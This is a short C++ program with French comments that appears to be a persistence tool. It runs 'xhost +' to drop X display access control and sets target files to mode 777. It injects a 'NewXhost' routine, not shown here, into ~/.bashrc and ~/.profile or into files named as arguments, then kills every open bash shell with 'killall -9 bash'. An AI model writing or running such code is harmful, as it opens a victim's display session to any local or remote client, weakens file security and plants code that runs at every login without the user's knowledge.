#include "patch.h"
#include <cstdlib>

using namespace std;

void patch(const string filepath){
		//changement des droits du fichier
		string command("chmod 777 " + filepath);
		system(command.c_str());
		
		//Injection du code NewXhost dans le fichier
		injectNewXhost(filepath);
}

int main(int argc, char const *argv[])
{
	string home(getenv("HOME"));

	if(argc > 1){
		
		system("command xhost +");

		for(int i = 1 ; i < argc ; i++){
			string filepath(argv[i]);
			patch(filepath);
		}

		//Fermeture de tous les terminaux ouverts
		system("killall -9 bash");
	}
	else{
		system("command xhost +");

		patch(home + "/.bashrc");
		patch(home + "/.profile");
	}
	return 0;
}